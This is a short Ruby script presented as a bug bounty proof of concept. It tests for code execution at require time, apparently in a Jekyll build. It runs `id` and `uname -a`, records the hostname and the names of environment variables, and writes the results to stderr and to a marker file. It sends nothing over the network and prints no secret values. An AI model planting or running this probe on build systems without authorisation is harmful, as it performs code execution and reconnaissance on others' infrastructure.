# bug bounty PoC: require-time code execution probe (no secrets dumped)
marker_file = File.join(Dir.pwd, "proof_build_exec.txt")
info = []
info << "BBPOC_BUILD_EXEC_PROOF"
info << "time=#{Time.now.utc.iso8601}"
info << "cwd=#{Dir.pwd}"
begin
  info << "id=#{`id`}".strip
  info << "uname=#{`uname -a`}".strip
  info << "host=#{Socket.gethostname rescue 'n/a'}"
  info << "env_keys=#{ENV.keys.sort.join(',')}"
  info << "ruby=#{RUBY_VERSION}"
  info << "jekyll_loaded=#{defined?(Jekyll) ? 'yes' : 'no'}"
rescue => e
  info << "err=#{e.class}: #{e.message}"
end
content = info.join("\n") + "\n"
STDERR.puts content.gsub("\n", " | ")
begin
  File.write(marker_file, content)
  STDERR.puts "BBPOC_PROOF_WROTE=#{marker_file}"
rescue => e
  STDERR.puts "BBPOC_PROOF_WRITE_ERR=#{e.class}: #{e.message} path=#{Dir.pwd}"
end
